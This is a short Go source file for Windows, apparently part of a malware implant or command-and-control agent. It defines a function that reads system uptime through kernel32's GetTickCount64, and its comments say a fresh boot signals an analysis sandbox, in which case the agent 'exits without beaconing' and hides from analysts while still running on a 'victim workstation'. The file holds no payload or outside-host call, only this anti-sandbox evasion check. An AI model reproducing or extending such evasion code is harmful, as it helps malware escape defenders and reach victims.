//go:build windows

package main

import (
	"golang.org/x/sys/windows"
)

// getUptimeMinutes returns how long the machine has been running, in minutes.
//
// Implementation: calls kernel32.GetTickCount64 which returns milliseconds
// elapsed since the OS booted.  This never wraps (unlike GetTickCount which
// wraps at ~49 days) and requires no elevated privileges.
//
// Why this matters:
//   Sandbox VMs are almost always freshly booted (uptime < 5 min).
//   A real analyst's machine or victim workstation will have been up for hours.
//   If uptime < 10 min → very likely a sandbox → agent exits without beaconing.
func getUptimeMinutes() int {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getTickCount64 := kernel32.NewProc("GetTickCount64")

	// GetTickCount64 signature: ULONGLONG GetTickCount64(void)
	// Call() returns (r1 uintptr, r2 uintptr, err error)
	// r1 holds the low 64 bits of the return value on AMD64.
	r1, _, _ := getTickCount64.Call()

	milliseconds := uint64(r1)
	minutes := int(milliseconds / 60_000)
	return minutes
}